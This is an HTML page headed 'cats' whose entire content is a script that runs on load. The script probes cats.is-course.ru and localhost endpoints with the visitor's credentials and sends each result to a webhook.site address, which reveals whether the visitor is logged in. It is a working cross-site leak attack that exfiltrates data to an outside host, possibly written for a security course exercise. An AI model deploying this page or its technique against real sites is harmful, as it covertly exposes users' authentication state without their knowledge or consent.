<!doctype html><html><head><meta charset="utf-8"></head><body><h1>cats</h1>
<script>
var U="5169748c-49df-4307-9820-7383309d9f02";
function beep(n){(new Image()).src="https://webhook.site/"+U+"/"+n;}
function probe(url,tag){
  fetch(url,{mode:"no-cors",credentials:"include",redirect:"error",cache:"no-store"})
   .then(function(){beep(tag+"_OK");})
   .catch(function(e){beep(tag+"_REDIR");});
}
probe("https://cats.is-course.ru/","root");            // control: always 200
probe("https://cats.is-course.ru/login","login");     // control: always 200
probe("https://cats.is-course.ru/settings","settings");// 200 only if logged in
probe("https://cats.is-course.ru/feedback","feedback");// 200 only if logged in
probe("https://cats.is-course.ru/nonexistent-xyz","404ct"); // control: 404 (resolves)
probe("http://localhost:8080/","locroot");
probe("http://localhost:8080/settings","locsettings");
setTimeout(function(){beep("end");},3000);
</script></body></html>
